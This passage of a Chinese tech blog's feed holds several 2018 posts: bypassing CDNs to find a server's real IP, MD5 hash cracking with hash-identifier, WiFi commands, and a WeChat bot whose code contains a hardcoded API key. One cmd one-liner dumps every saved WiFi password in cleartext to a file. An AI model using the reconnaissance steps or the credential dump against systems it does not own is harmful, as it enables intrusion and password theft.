    <content type="text"><![CDATA[什么是CDN加速？CDN的全称是Content Delivery Network，即内容分发网络，这个概念是1998年提出的。当时美国麻省理工大学(MIT)的一批研究生通过分析当时Internet的网络状况，提出了一套能够实现用户就近访问的解决方案，最终设计并实现了其独有的系统。CDN有什么作用？CDN基本思路就是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。CDN核心目的就是使用户可就近访问网络，取得所需内容，解决网络拥挤的状况，明显提高用户访问网站的响应速度或者用户下载速度。对用户来说，如果一个网站开启了CDN，用户访问速度或者下载速度相比之前会更快。一般来说，网站开启CDN之后，可以提升用户体验。 对网站有什么好处？首先，开启CDN后的网站，会根据用户所在地的不同访问CDN的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源，降低服务器压力。这也就是大家都在ping百度，但是不同地区得到的反馈ip不一样的原因。其次，由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DDoS攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。 怎么查看一个网站开启了CDN呢？方法很简单，只要在不同的地区ping网址就可以了。我们可以使用网上的一些提供免费代理的网站，挂一个代理，就可以获取不同地区的IP了，然后你再去ping就可以了。也可以使用一个在线的工具，ping.chinaz.com这是一个使用了CDN的网站这是一个没有使用CDN的网站 还可以使用kali工具查询dnsenum是一款域名信息收集工具1root@kali:~# dnsenum -o /root/baidu.com -t 30 --threads 30 baidu.com dnsrecon是一款很强大的dns信息手机工具1root@kali:~# dnsrecon -d baidu.com -n 114.114.114.114 --threads 15 --lifetime 30 --xml /root/baidu.com1 这2款工具都是可以验证一个网站是否运用了CDN技术。 怎么绕过CDN查找真实IP呢？二级域名法目标站点一般不会把所有的二级域名放cdn上，比如试验性质地二级域名。Google site一下目标的域名，看有没有二级域名出现，挨个排查，确定了没使用cdn的二级域名后，本地将目标域名绑定到同ip，能访问就说明目标站与此二级域名在同一个服务器上。不在同一服务器也可能在同C段，扫描C段所有开80端口的ip，挨个试。如果google搜不到也不代表没有，我们拿常见的二级域名构造一个字典，猜出它的二级域名。比如mail、cache、img。 nslookup法大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。其实这个方法根本不用上国外vpn，因为你上国外vpn的ping本质，就是使用国外dns(那台vpn服务器使用的dns)查询域名而已，所以只需要：nslookuphttp://xxx.com 国外dns，就行了，例如：nslookup http://xxx.com 8.8.8.8，提示：你要找冷门国外DNS才行，像谷歌的DNS，国内用的人越来越多了，很多CDN提供商都把谷歌DNS作为国内市场之一，所以，你查到的结果会和国内差不了多少，或者查询域名的NS记录，其域名记录中的MX记录，TXT记录等很有可能指向的是真实ip或同C段服务器。 ping法ping 命令这样写 ping http://xxx.com 而不是 ping www. xxx .com，ping http://xxx.com一般都会是真实IP，因为了解到现有很多CDN厂商基本只要求把 www. xxx .com cname到cdn主服务器上去。www. xxx .com和http://xxx.com 是两条独立的解析记录 一般只会把 www. xxx .com 做 CDN。或者使用国外的多节点ping工具，例如just-ping，全世界几十个节点ping目标域名，很有可能找到真实ip。域名：CA App Synthetic Monitor website monitoring 使用在线工具查询https://myssl.com/cdn_check.htmlTips： 如果你需要更多的在线工具可以点此获取本博客提供的在线工具扫码进群，我等待你的加入]]></content>
      <categories>
        <category>社会工程学</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>CDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详解MD5解密原理]]></title>
    <url>%2F2018%2F03%2F23%2F%E8%AF%A6%E8%A7%A3MD5%E8%A7%A3%E5%AF%86%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[MD5：Message Digest Algorithm MD5（中文名为消息摘要算法第五版）为计算机安全领域广泛使用的一种散列函数，用以提供消息的完整性保护。MD5的前身有MD2、MD3和MD4。 MD5算法具有以下特点：1、压缩性：任意长度的数据，算出的MD5值长度都是固定的。2、容易计算：从原数据计算出MD5值很容易。3、抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。4、强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。 今天不是要你们来看这些百科中的词条的，今天要说的是md5的解密原理，了解了原理，你以后在做解密工作的时候或者自己用python写一个破解md5的脚本的时候才可以做的更好。 MD5是不可逆算法，目前看来只能通过暴力破解的方式才可以进行解密。在写软件的时候也会用到MD5，实现一些数据的加密，如果你的应用需要可逆的加密方法，请考虑使用 DES,3DES,AES,RSA 等加密算法。 众所周知，MD5是不可逆的，也就是加密后不能再根据加密的秘钥去解密，那么那些解密网站是怎么进行解密的呢？因为MD5是不可逆的，所以我们不能直接解密出MD5对应的值。但是不同的字符串生成的md5值都是唯一的，我们在校验软件的完整度的时候，通常都是用md5进行比对来测试 也是这个原理。我们不能直接进行解密，因为没有什么解密字典与md5码对应，我们只能从反面来做，自己加密一个字符串，生成一个md5值，然后再与加密的md5进行比对，也就是用已知的MD5值不断与未知的MD5值进行碰撞，如果两者对比后相同，就认定该MD5的值就是该明文了，也就是解密出来了。在众多的MD5中，总会有一些MD5值是符合的。这其实算是一种逆向思维了。但是应用md5加密容易，来进行对比就很难了，因为有些密码我们可能还没有加密比对过，这也是为什么有些md5还解密不出来的原因。 密码之所以用MD5加密，就是为了不可解密。正常有良心的设计，不能让用户的密码可以解开，因为人的懒惰是天生的，所以大部份的人只会用两三个常用密码。所以外国的密码设计是这样的，你输入一个密码（明文），用MD5加密后保存在数据库中。下次要验证密码也好办，把用户的输入用MD5加密后，与数据库中加密过的数据对比，相同的话，就表示密码正确。这样的设计还有另外一个好处，就是可以一定程度上防止SQL注入。网上的暴力破解其实也是利用这个原理，他把许多已知明文的，用MD5加密后，保存起来。你要反查，他实际上是在数据库中查找加密过的，是否有与你查询的MD5串相同，如果相同的话，就把明文给你看。这样的设计表达的是一个互相尊重的理念，系统管理员/开发员是无权知道用户的密码的。如果用户忘记密码，管理员只能用重置密码的方式。所以现在很多软件在你忘记密码的时候，你只能选择进行身份验证后重置密码。 在安全领域中，加密数据随处可见。而在这些数据中，重要的数据往往采用哈希算法进行加密。例如，Linux密码使用sha512，Windows密码采用LM、NTLM，而网站密码采用MD5。这些常见哈希算法有几十种。虽然每种密文都有一定规律，但是单纯靠记忆和经验来的判断就比较困难了。而且如果你连加密的方式都不知道的话，你又如何进行快速解密呢？kali linux提供工具hash-identifier来实现这个功能。大家只要运行该命令，然后输入哈希密文，就可以得到密文所使用的哈希算法类型。有了这个算法类型，再选择对应的工具或者彩虹表，获取密码明文就容易多了。打开终端，直接输入1root@kali:~# hash-identifier 就可以打开hash-identifier了。然后我们输入你需要解密的密码它就会列出可能的加密方法，这样更便于你进行解密。如果你要进行解密MD5，你可以点击此链接到本站提供的在线工具进行解密，解密网站很多，总有一款适合你的。]]></content>
      <categories>
        <category>加密解密</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详解C语言头文件stdio.h]]></title>
    <url>%2F2018%2F03%2F22%2F%E8%AF%A6%E8%A7%A3C%E8%AF%AD%E8%A8%80%E5%A4%B4%E6%96%87%E4%BB%B6stdio-h%2F</url>
    <content type="text"><![CDATA[头文件stdio.h ，为C语言中的标准头文件，这是一个名字为stdio，后缀名为.h的文件。以VC6为例，可以找到VC6编译器下VC6.0 完整绿色版\VC98\Include\目录，即可看到stdio.h文件。也可以直接在程序当中，右键头文件点击打开，也可以直接打开stdio.h的内容，如下图：打开stdio.h文件后，如下图: 头文件的作用那么看清之后，接下来我们来说一说，头文件的作用还是以hello world这个程序为例，相信很多朋友想过：明明就显示一句话”Hello world”竟然足足写了五六行代码，而真正有用的可能就那句printf了，其他都是什么鬼，比如第一句那个#include&lt;stdio.h&gt; ，它是什么鬼？写它有用吗？ 我删了它一样运行显示Hello world啊！没错，在VC6环境下，即使Hello world这个程序去掉第一行的文件包含也就是#include&lt;stdio.h&gt;这句话程序仍然可以编译成功并且运行！但不同的是大家需要注意这个时候编译是有一个警告的！怎么样？看懂了吗? 是提示你printf这个函数没有定义！ (printf并不属于C语言本身，不懂的同学请自行补脑)这是因为在stdio.h这个头文件中有关于printf的定义，也就是printf这个函数是定义在stdio这个文件里，printf并不是C语言的函数，不属于函数本身。可以这么打个比方：编译器好比是你的管家，负责家(程序)的安全，一经发现任何可疑的人员都禁止进屋！而printf就这么被抓住了！你既然想让它进屋，能做的，就是提前告诉管家我要让它进来，也就是提前声明。可时间一长，你发现有很多这样的人想让进来，每次都一个个声明太累了，索性就建立一个白名单，把想让进屋的人都写进去，都声明起来，到时候让管家看白名单得了！于是乎，就有了头文件的样子，也就是包含头文件。#include&lt;stdio.h&gt;这句话。但凡想用到谁，就包含含有谁的头文件。比如你用printf函数打印东西，那你就要包含stdio.h的头文件如果你用pow函数算多立方，那你就要包含math.h的头文件如果你要用strcmp函数接收一个字符，那你就要包含string.h的头文件 （3）头文件如何被包含？最后，在看一个C语言是如何”包含”这些头文件的，答案就是#include这个预处理命令！所谓预处理，即可以在编译器编译之前，做一些预先要做的准备工作，比如宏替换、展开等等，而包含头文件其实也就是把头文件里的内容原封不动的放到程序的最前面，仅此而已！还不信？来动手试试，依旧以Hello world为例 123456#include&lt;stdio.h&gt;int main()&#123; printf(“hello world!\n”); return 0;&#125; 先删除掉#include&lt;stdio.h&gt;这句话，然后将stdio.h中的内容复制到你的主函数前面，变成这样：]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详解HTTP协议]]></title>
    <url>%2F2018%2F03%2F22%2F%E8%AF%A6%E8%A7%A3HTTP%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[HTTP：是Hyper Text Transfer Protocol的缩写，即 超文本传输协议，是一种请求/响应式的协议。具有灵活的特点，可以运行任意类型的数据，该数据的类型由Content-Type加以标记。属于无状态协议，即对事物处理没有记忆能力，如果后续处理需要前面的信息，则必须重新传输。现在通用的一般都是HTTP1.0和HTTP1.1这2个版本。介绍一下这两个版本的区别： HTTP1.0在传输数据的时候，客户端与服务器端建立连接后，每次只能处理一个HTTP请求。 HTTP1.1在建立连接后，可以传送多个HTTP请求和响应，从而减少了建立和关闭连接的消耗和耗时。 HTTP地址即网页地址，也就是URL（统一资源定位符），在浏览器的地址栏上就是。URL格式：http://host[:port][abs_path]或者https://host[:port][abs_path]。在上述格式中，http即http协议，https是加密了的http协议。host是Internet主机域名或者IP地址。port是端口号，一般是空，默认的是80端口，有时候也会出现8080端口。abs_path是请求资源的URI，就是主机上资源的目录。 HTTP的8种请求方式最常用的请求方式是get和post。他们的区别为： GET方式的请求传输的数据不能超过1kb。而且如果浏览器请求的URL中含有参数，在浏览器生成的请求消息中，参数部分将附加在请求行中的资源路径后面。会在url地址栏以明文显示。 POST传输的数据无大小限制，是通过实体内容传递数据的。而且请求方式比GET方式更安全。post请求方式传递的参数隐藏在实体内容中，用户是看不到的，即不会再url地址栏以铭文显示。 http的5种状态码:1xx：指示信息–表示请求已接收，继续处理2xx：成功–表示请求已被成功接收、理解、接受3xx：重定向–要完成请求必须进行更进一步的操作4xx：客户端错误–请求有语法错误或请求无法实现5xx：服务器端错误–服务器未能实现合法的请求 几个web开发中常见的http状态码:(最好可以记住) 200:服务器成功处理了客户端的请求。 204:请求被受理但没有资源可以返回. 206:客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。 302:临时重定向，请求的资源临时从不同的url响应请求，但请求者应继续使用原有位置来进行以后的请求。例如：在请求重定向中，临时uri应该是响应的Location头字段所指向的资源。 303:与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上。 304:发送附带条件的请求时，条件不满足时返回，与重定向无关。 307:临时重定向，与302类似，只是强制要求使用POST方法。 400:请求报文语法有误，服务器无法识别。 401:请求需要认证。 403:资源不可用。服务器理解客户的请求，但拒绝处理它，通常由于服务器上文件或目录的权限设置导致的WEB访问错误。请求的对应资源禁止被访问。 404:服务器找不到请求的资源。例如：访问服务器不存在的网页经常返回此状态码。 500:服务器发生错误，无法处理客户端的请求。 503：服务器正忙。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali更新源设置]]></title>
    <url>%2F2018%2F03%2F18%2Fkali%E6%9B%B4%E6%96%B0%E6%BA%90%E8%AE%BE%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[kali自带的源是国外的，我们在进行安装软件和更新软件的时候非常缓慢。这个时候我们需要换一下源，换成国内速度较快的一些源。打开终端,用gedit打开源文件。1root@kali:~# gedit /etc/apt/sources.list 打开后把一下软件源复制粘贴进去。Tips：强烈建议你复制粘贴进去，如果你已经安装了vm-tools，复制粘贴很容易的，请不要手动输入源进行添加，你写对的几率很小，多一个空格或者少一个字母，你的源就不能正常使用。123456789101112131415161718192021222324252627#中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#阿里云#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#浙大#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#东软大学#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#官方源#deb http://http.kali.org/kali kali-rolling main non-free contrib#deb-src http://http.kali.org/kali kali-rolling main non-free contrib#重庆大学#deb http://http.kali.org/kali kali-rolling main non-free contrib#deb-src http://http.kali.org/kali kali-rolling main non-free contrib 然后保存退出。warning：你最好不要删除自带的源，如果你添加的源有问题的话，也不至于你的系统没有源列表可进行更新。然后运行以下命令，进行更新源列表和更新软件包。1root@kali:~# apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade warning:在进行更新操作前，请确认你的网络环境良好，因为如果你的网络不稳定或者延迟很严重的话，在更新源的时候有些软件包可能下载不了，或者依赖不能正常下载安装，导致一些软件的运行环境出现问题，后续不能正常操作，会出现很多的问题。 Tips：如果你的系统需要很多更新的软件包很多的话，会花费很长时间进行更新，过程会很漫长，还请你耐心等待。但是请不要在中途中断操作，比如关机或直接ctr+c，退出终端，这样会给你的系统造成很大的伤害。 如图是更新完成。 最后简单的说明以下，如果在更新的时候，出现404 not found,请按照报错尝试检测一下你添加的源是不是存在，或者已经不可用了。你需要做的是把源的url复制进浏览器的地址栏，然后打开就可以了。如果可以正常访问，就说明那个源是正常可以使用的。如图所示，是我对清华大学的一个源的检测，你们也可以这样做。ok！]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装谷歌拼音输入法]]></title>
    <url>%2F2018%2F03%2F18%2Fkali%E5%AE%89%E8%A3%85%E8%B0%B7%E6%AD%8C%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95%2F</url>
    <content type="text"><![CDATA[kali下除了安装搜狗拼音输入法外，还可以选择谷歌拼音输入法，谷歌拼音输入法其实还是非常智能的。想用它的可以看看本教程安装一下。安装环境:虚拟机环境下的Kali Linux 64 Bit 2018.1先更新一下软件源列表1root@kali:~# apt-get update &amp;&amp; apt-get upgrade 记住一定要更新一下!!!首先安装fcitx(小企鹅输入法框架)。1root@kali:~# apt-get install fcitx 然后安装谷歌拼音输入法。1root@kali:~# apt-get install fcitx-googlepinyin 安装后，搜索fcitx进行设置。按ctr+空格，召唤出谷歌拼音输入法。下面是安装好的样子]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装搜狗输入法]]></title>
    <url>%2F2018%2F03%2F18%2Fkali%E5%AE%89%E8%A3%85%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%2F</url>
    <content type="text"><![CDATA[安装环境:虚拟机环境下的Kali Linux 64 Bit 2018.1先更新一下软件源列表1root@kali:~# apt-get update &amp;&amp; apt-get upgrade 记住一定要更新一下!!!首先安装fcitx(小企鹅输入法框架)。1root@kali:~# apt-get install fcitx 接着安装，因为搜狗拼音输入法是依赖这些软件包的，所以先进行安装。1root@kali:~# apt install libopencc1 fcitx-libs fcitx-libs-qt 在安装的时候会报错，如下图所示按照提示运行一下提示的命令进行修复一下即可。1root@kali:~# apt --fix-broken install 然后再出什么报错，例如：软件包libopencc1 libopencc2未安装啥的，请自动忽略吧，你自己是根本安装不了的。你别管它，直接继续进行就可以了。下面打开浏览器下载搜狗拼音输入法。官方地址：https://pinyin.sogou.com/linux/?r=pinyin选择适合自己kali型号的即可。然后我们开始安装。1root@kali:~# dpkg -i sogoupinyin_2.2.0.0102_amd64.deb 安装后，搜索fcitx进行设置。然后按ctr+空格，召唤出搜狗拼音输入法。如图所示就是安装好的样子。我是没有重启kali直接就可以使用了。如果你的没反应的话，请输入reboot，重启kali再继续操作。ok,教程结束，撒花花(●’◡’●)]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用python制作微信聊天机器人]]></title>
    <url>%2F2018%2F03%2F17%2F%E7%94%A8python%E5%88%B6%E4%BD%9C%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E6%9C%BA%E5%99%A8%E4%BA%BA%2F</url>
    <content type="text"><![CDATA[itchat是一个开源的微信个人号接口，使用python调用微信从未如此简单。使用不到三十行的代码，你就可以完成一个能够处理所有信息的微信机器人。这是itchat项目的官网：http://itchat.readthedocs.io/zh/latest/大家有兴趣的可以去上面了解看看。上面的用法介绍都很全面的，希望大家可以学到很多。下面我来做个简单的示范。首先你需要一个图灵机器人的账号，这样就可以获取一个api的key了。这是图灵机器人的官网:http://www.tuling123.com/登陆进去后，进入机器人设置里找到apikey，稍后会用到。现在我们需要一个python2的环境。我是在自己的Ubuntu系统里写的python代码，Ubuntu已经自带了python2.7和python3.5的环境。本次的代码是用的python2.7。这次的python代码需要用到itchat和requests模块。其中requests模块是python2.7已经默认安装的了。所以我们需要安装itchat模块。我们采用pip安装，也建议大家以后再安装python模块的时候用pip进行安装，可以获取到最新的最官方的模块。我们先安装pip。1lengyue@ubuntu:~$ sudo apt install python-pip 然后开始用pip安装itchat模块。1lengyue@ubuntu:~$ pip install itchat 现在准备工作已经做好了，我们开始写代码。创建一个.py的文件。1lengyue@ubuntu:~$ touch wechat_robot.py 然后进行编辑代码。1lengyue@ubuntu:~$ gedit wechat_robot.py 代码如下:12345678910111213141516171819202122#!/usr/bin/python#coding:utf-8 import itchatimport requestsdef get_response(msg): apiUrl = &apos;http://www.tuling123.com/openapi/api&apos; data = &#123; &apos;key&apos;: &apos;f8d0336b17a94258906188a9fc51933a&apos;, # Tuling ApiKey &apos;info&apos;: msg, # 这是我们发出去的消息 &apos;userid&apos;: &apos;wechat-robot&apos;, # 这里你想改什么都可以 &#125; # 我们通过如下命令发送一个post请求 r = requests.post(apiUrl, data=data).json() return r.get(&apos;text&apos;)@itchat.msg_register(itchat.content.TEXT)def print_content(msg): return get_response(msg[&apos;Text&apos;])@itchat.msg_register([itchat.content.TEXT], isGroupChat=True)def print_content(msg): return get_response(msg[&apos;Text&apos;])itchat.auto_login(True)itchat.run() Tips:我们在key那里把自己申请的apikey复制粘贴进去就可以了，其他的代码不需要改动。保存后，我们开始运行程序。1lengyue@ubuntu:~$ python wechat_robot.py 此时会出现一个二维码，和你登陆电脑板的微信的二维码差不多，会要你扫描二维码后在手机上确认登陆微信网页版。以下是在终端下的提示。当我们成功登陆后，微信就可以自动回复了。你可以要你的微信好友和你一起测试以下。而且在微信群里也是可以自动回复的。以下是我测试的截图。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cmd命令解决蓝屏问题]]></title>
    <url>%2F2018%2F03%2F15%2Fcmd%E5%91%BD%E4%BB%A4%E8%A7%A3%E5%86%B3%E8%93%9D%E5%B1%8F%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[有时候我们在使用win10的时候会在锁屏界面突然出现蓝屏问题。我们可以尝试输入cmd命令解决一下。win+X，然后按一下A键，打开Windows power shell(管理员)。输入以下命令。123456if exist "%SystemRoot%\System32\InputMethod\CHS\ChsIME.exe" (takeown /f "%SystemRoot%\System32\InputMethod\CHS\ChsIME.exe" /Aicacls "%SystemRoot%\System32\InputMethod\CHS\ChsIME.exe" /deny "NT AUTHORITY\SYSTEM:RX") 以上就是Win10锁屏蓝屏的原因与解决办法，希望对大家有所帮助。另外，如果以上方法无法解决，可以尽量少锁屏或者尝试系统重置、系统还原、重装系统解决。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>cmd命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cmd命令下的WiFi]]></title>
    <url>%2F2018%2F03%2F15%2Fcmd%E5%91%BD%E4%BB%A4%E4%B8%8B%E7%9A%84WiFi%2F</url>
    <content type="text"><![CDATA[前提：需要网卡支持收发信号，当然笔记本都支持了现在。1netsh wlan show networks mode=bssid 如果你输入命令后，显示如下界面。你只需要打开wlan的服务就可以了。win+R,打开运行程序，输入services.msc.在打开的选项卡中双击服务和应用——服务。在中间的服务栏目中找到WLAN AutoConfig，如果没有启动，点击启动。如果已经启动，点击重新启动。双击打开。然后点击确定。好了，现在就已经开启wlan服务了。1netsh wlan show profiles 1netsh wlan show drivers 1for /f "skip=10 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @for /f "tokens=1-2 delims=:" %k in ('netsh wlan show profiles %j key ^= clear ^|findstr /i "关键内容"') do @echo %j,%l&gt;&gt; %USERPROFILE%\desktop\1.txt 可以生成一个txt文本，查看连接过的WiFi及密码。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>cmd命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在线体验Ubuntu系统]]></title>
    <url>%2F2018%2F03%2F15%2F%E5%9C%A8%E7%BA%BF%E4%BD%93%E9%AA%8CUbuntu%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[很多Linux都有live模式，大部分都是在安装界面的第一个选项。这个live模式就是进行用户体验的，你在里面进行的任何操作都是不会保留的。当你退出系统后，马上又会变回原来的样子。你做的任何改动立刻消失。Ubuntu官方更为人性化，做了一个在线虚拟化的Ubuntu进行体验。如果你有使用Ubuntu的想法，但是对Ubuntu的特点并不了解，你感觉下载Ubuntu并且进行安装很麻烦。当你对此举棋不定的时候，那么你可以使用Ubuntu官方提供的在线体验Ubuntu系统。点此进入在线体验。当然这只是在线的一个Ubuntu系统，你并不能进行太多的操作，你只能查看一些Ubuntu自带的软件，你是不能修改里面的软件的。你仅仅可以根据这个在线Ubuntu大致浏览一些Ubuntu的基础功能。如果你想更深入的了解或者使用Ubuntu，你可以下载Ubuntu并且进行安装。你可以安装到虚拟机中，也可以使用Windows的子系统Ubuntu。点此查看Windows安装Ubuntu。如果你想试试Ubuntu系统，那么就现在立马开始体验这个在线Ubuntu系统吧。PS:Ubuntu官网:https://www.ubuntu.com/ Ubuntu下载:http://www.ubuntu.org.cn/download/desktop https://www.ubuntu.com/download/desktop]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu之终端浏览器]]></title>
    <url>%2F2018%2F03%2F11%2FUbuntu%E4%B9%8B%E7%BB%88%E7%AB%AF%E6%B5%8F%E8%A7%88%E5%99%A8%2F</url>
    <content type="text"><![CDATA[W3M是Linux的终端网络浏览器,也是一个开源的文字式网页浏览器。W3M只支持文字，如果你想获取图像支持，需要安装w3m-img软件包。下面开始安装。1lengyue@ubuntu:~$ sudo apt-get install w3m w3m-img 安装完成后，查看一下帮助手册。1lengyue@ubuntu:~$ man w3m 操作姿势：在操作中，我们可以使用pageup和pagedown来进行翻页，用↑↓来进行上下滑动查看网页。如果我们需要退出w3m浏览器，我们按一下q,然后再按一下y,就可以成功退出了。在打开的网页中，蓝色的字体为链接，我们可以按下enter键来打开该链接。在打开的时候，在终端的左下角会出现一个http状态码，如果为200，则表明可以正常打开网页。现在开始简单的示范一下怎么浏览网页。比如打开百度首页。1lengyue@ubuntu:~$ w3m baidu.com 打开我的博客首页。1lengyue@ubuntu：～$ w3m www.bingyublog.com 好了，基本操作就这些，其他的操作姿势可以在使用过程中自己摸索。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu配置Telnet服务]]></title>
    <url>%2F2018%2F03%2F11%2FUbuntu%E9%85%8D%E7%BD%AETelnet%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[Telnet属于TCP/IP协议，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。Telnet命令用于登录远程主机，对远程主机进行管理。telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。但仍然有很多别的系统可能采用了telnet方式来提供远程登录。下面开始安装Telnet服务。首先我们需要验证一下自己的Linux系统是否已经安装了telnet服务。1lengyue@ubuntu:~$ netstat -a | grep telnet 如果出现空。就说明并没有安装telnet服务。下面我们开始安装telnet服务。12lengyue@ubuntu:~$ sudo apt-get install openbsd-inetdlengyue@ubuntu:~$ sudo apt-get install telnetd 然后我们开始重启telnet服务使之生效。1lengyue@ubuntu:~$ /etc/init.d/openbsd-inetd restart 输入密码认证一下。然后我们现在查看一下telnet的运行状态。1lengyue@ubuntu:~$ netstat -a | grep telnet 好了，安装成功！ 查看一下manual手册：介绍一些常用的命令参数：(不需要都记住，用的时候可以随时查看man手册就可以了)-8：允许使用8位字符资料，包括输入与输出；-a：尝试自动登入远端系统；-b&lt;主机别名&gt;：使用别名指定远端主机名称；-c：不读取用户专属目录里的.telnetrc文件；-d：启动排错模式；-e&lt;脱离字符&gt;：设置脱离字符；-E：滤除脱离字符；-f：此参数的效果和指定”-F”参数相同；-F：使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机；-k&lt;域名&gt;：使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名；-K：不自动登入远端主机；-l&lt;用户名称&gt;：指定要登入远端主机的用户名称；-L：允许输出8位字符资料；-n&lt;记录文件&gt;：指定文件记录相关信息；-r：使用类似rlogin指令的用户界面；-S&lt;服务类型&gt;：设置telnet连线所需的ip TOS信息；-x：假设主机有支持数据加密的功能，就使用它；-X&lt;认证形态&gt;：关闭指定的认证形态。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux之输入输出重定向]]></title>
    <url>%2F2018%2F03%2F11%2FLinux%E4%B9%8B%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91%2F</url>
    <content type="text"><![CDATA[输入重定向是指把文件导入到命令中，而输出重定向则是指把原本要输出到屏幕的数据信息写入到指定文件中。在日常的学习和工作中，相较于输入重定向，我们使用输出重定向的频率更高，所以又将输出重定向分为了标准输出重定向和错误输出重定向两种不同的技术，以及清空写入与追加写入两种模式。将文件1作为命令的标准输入并将标准输出到文件2➢标准输入重定向（STDIN，文件描述符为0）：默认从键盘输入，也可从其他文件或命令中输入。➢标准输出重定向（STDOUT，文件描述符为1）：默认输出到屏幕。➢错误输出重定向（STDERR，文件描述符为2）：默认输出到屏幕。输入输出重定向在编写shell脚本的时候特别重要，而且十分有用。下面我写个简单的shell脚本，示范一下1234#! /bin/bash# 简单的重定向脚本实例ls /home/lengyue/ &gt; read.txtcat read.txt]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu安装pstree]]></title>
    <url>%2F2018%2F03%2F10%2FUbuntu%E5%AE%89%E8%A3%85pstree%2F</url>
